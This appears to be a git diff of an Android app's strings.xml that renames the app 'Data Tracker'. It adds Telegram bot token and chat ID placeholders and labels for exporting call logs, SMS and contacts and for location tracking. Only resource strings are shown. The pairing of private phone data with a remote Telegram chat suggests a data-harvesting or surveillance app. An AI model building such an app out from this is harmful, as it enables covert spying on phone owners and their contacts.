@@ -1,3 +1,14 @@
 <resources>
-    <string name="app_name">lta</string>
+    <string name="app_name">Data Tracker</string>
+    <string name="telegram_bot_token">YOUR_BOT_TOKEN</string>
+    <string name="telegram_chat_id">YOUR_CHAT_ID</string>
+    <string name="export_call_logs">Export Call Logs</string>
+    <string name="export_sms">Export SMS Messages</string>
+    <string name="export_contacts">Export Contacts</string>
+    <string name="permission_required">Permission Required</string>
+    <string name="data_sent">Data sent successfully!</string>
+    <string name="data_send_failed">Failed to send data</string>
+    <string name="press_to_export">Press buttons to export data</string>
+    <string name="location_service_running">Location tracking is active</string>
+    <string name="location_permission_needed">Location permission is needed for this feature</string>
 </resources>
